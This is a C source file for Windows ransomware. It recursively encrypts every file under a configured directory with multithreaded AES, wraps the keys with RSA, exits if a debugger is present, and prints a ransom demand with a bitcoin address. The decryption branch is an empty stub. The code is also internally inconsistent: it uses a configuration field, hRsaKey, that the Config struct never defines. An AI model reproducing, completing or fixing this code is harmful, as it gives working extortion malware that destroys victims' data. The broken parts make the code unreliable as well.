#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <process.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")

#define MAX_THREADS 8
#define LOG_FILE "ransomware.log"
#define CONFIG_FILE "config.enc"
#define AES_KEY_SIZE 32
#define RSA_KEY_SIZE 2048

// Global configuration
typedef struct {
    char target_dir[MAX_PATH];
    char ransom_message[1024];
    char bitcoin_address[64];
    int encrypt_flag;
} Config;

Config g_config;

// Thread-safe logging
void log_message(const char *message) {
    FILE *log = fopen(LOG_FILE, "a");
    if (log) {
        time_t now = time(NULL);
        fprintf(log, "[%s] %s\n", ctime(&now), message);
        fclose(log);
    }
}

// Anti-debugging: Check for debugger presence
int is_debugger_present() {
    return IsDebuggerPresent();
}

// Anti-debugging: Terminate if debugger is detected
void anti_debug() {
    if (is_debugger_present()) {
        log_message("Debugger detected. Exiting...");
        ExitProcess(1);
    }
}

// Generate RSA key pair
void generate_rsa_key(HCRYPTPROV hProv, HCRYPTKEY *hKey) {
    if (!CryptGenKey(hProv, CALG_RSA_KEYX, RSA_KEY_SIZE | CRYPT_EXPORTABLE, hKey)) {
        log_message("Error generating RSA key");
        ExitProcess(1);
    }
}

// Encrypt AES key with RSA
void encrypt_aes_key(HCRYPTKEY hRsaKey, BYTE *aes_key, DWORD aes_key_size, BYTE *encrypted_key, DWORD *encrypted_key_size) {
    if (!CryptEncrypt(hRsaKey, 0, TRUE, 0, encrypted_key, encrypted_key_size, aes_key_size)) {
        log_message("Error encrypting AES key");
        ExitProcess(1);
    }
}

// Encrypt file using AES
void encrypt_file(const char *filename, BYTE *aes_key) {
    FILE *file = fopen(filename, "rb+");
    if (!file) {
        log_message("Error opening file for encryption");
        return;
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    BYTE *plaintext = malloc(file_size);
    fread(plaintext, 1, file_size, file);

    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        log_message("Error acquiring crypto context");
        fclose(file);
        free(plaintext);
        return;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        log_message("Error creating hash");
        CryptReleaseContext(hProv, 0);
        fclose(file);
        free(plaintext);
        return;
    }

    if (!CryptHashData(hHash, aes_key, AES_KEY_SIZE, 0)) {
        log_message("Error hashing data");
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        fclose(file);
        free(plaintext);
        return;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        log_message("Error deriving AES key");
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        fclose(file);
        free(plaintext);
        return;
    }

    DWORD encrypted_size = file_size;
    if (!CryptEncrypt(hKey, 0, TRUE, 0, plaintext, &encrypted_size, file_size)) {
        log_message("Error encrypting file");
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        fclose(file);
        free(plaintext);
        return;
    }

    fseek(file, 0, SEEK_SET);
    fwrite(plaintext, 1, file_size, file);

    fclose(file);
    free(plaintext);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}

// Thread function for parallel encryption
unsigned __stdcall encrypt_thread(void *param) {
    char *filepath = (char *)param;
    BYTE aes_key[AES_KEY_SIZE];
    HCRYPTPROV hProv;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        log_message("Error acquiring crypto context in thread");
        return 1;
    }

    if (!CryptGenRandom(hProv, AES_KEY_SIZE, aes_key)) {
        log_message("Error generating AES key in thread");
        CryptReleaseContext(hProv, 0);
        return 1;
    }

    encrypt_file(filepath, aes_key);

    BYTE encrypted_key[256];
    DWORD encrypted_key_size = sizeof(encrypted_key);
    encrypt_aes_key(g_config.hRsaKey, aes_key, AES_KEY_SIZE, encrypted_key, &encrypted_key_size);

    char key_filename[MAX_PATH];
    snprintf(key_filename, MAX_PATH, "%s.key", filepath);
    FILE *key_file = fopen(key_filename, "wb");
    fwrite(encrypted_key, 1, encrypted_key_size, key_file);
    fclose(key_file);

    CryptReleaseContext(hProv, 0);
    return 0;
}

// Encrypt directory recursively with multi-threading
void encrypt_directory(const char *path) {
    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*", path);

    WIN32_FIND_DATA find_data;
    HANDLE hFind = FindFirstFile(search_path, &find_data);

    if (hFind == INVALID_HANDLE_VALUE) {
        log_message("Error finding files");
        return;
    }

    HANDLE threads[MAX_THREADS];
    int thread_count = 0;

    do {
        if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0) {
            continue;
        }

        char filepath[MAX_PATH];
        snprintf(filepath, MAX_PATH, "%s\\%s", path, find_data.cFileName);

        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            encrypt_directory(filepath);
        } else {
            threads[thread_count] = (HANDLE)_beginthreadex(NULL, 0, encrypt_thread, _strdup(filepath), 0, NULL);
            thread_count++;

            if (thread_count >= MAX_THREADS) {
                WaitForMultipleObjects(thread_count, threads, TRUE, INFINITE);
                thread_count = 0;
            }
        }
    } while (FindNextFile(hFind, &find_data) != 0);

    FindClose(hFind);

    if (thread_count > 0) {
        WaitForMultipleObjects(thread_count, threads, TRUE, INFINITE);
    }
}

// Display ransom message
void display_ransom_message() {
    printf("\n\n========================================\n");
    printf("%s\n", g_config.ransom_message);
    printf("Send payment to: %s\n", g_config.bitcoin_address);
    printf("========================================\n\n");
}

// Load configuration from encrypted file
void load_config() {
    FILE *file = fopen(CONFIG_FILE, "rb");
    if (!file) {
        log_message("Error opening config file");
        ExitProcess(1);
    }

    fread(&g_config, sizeof(Config), 1, file);
    fclose(file);
}

// Main function
int main(int argc, char *argv[]) {
    anti_debug();
    load_config();

    if (argc < 2) {
        printf("Usage: %s <encrypt|decrypt>\n", argv[0]);
        return 1;
    }

    HCRYPTPROV hProv;
    HCRYPTKEY hRsaKey;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        log_message("Error acquiring crypto context");
        return 1;
    }

    generate_rsa_key(hProv, &hRsaKey);

    if (strcmp(argv[1], "encrypt") == 0) {
        encrypt_directory(g_config.target_dir);
        display_ransom_message();
    } else if (strcmp(argv[1], "decrypt") == 0) {
        // Decryption logic here
    } else {
        printf("Invalid command\n");
    }

    CryptDestroyKey(hRsaKey);
    CryptReleaseContext(hProv, 0);

    return 0;
}
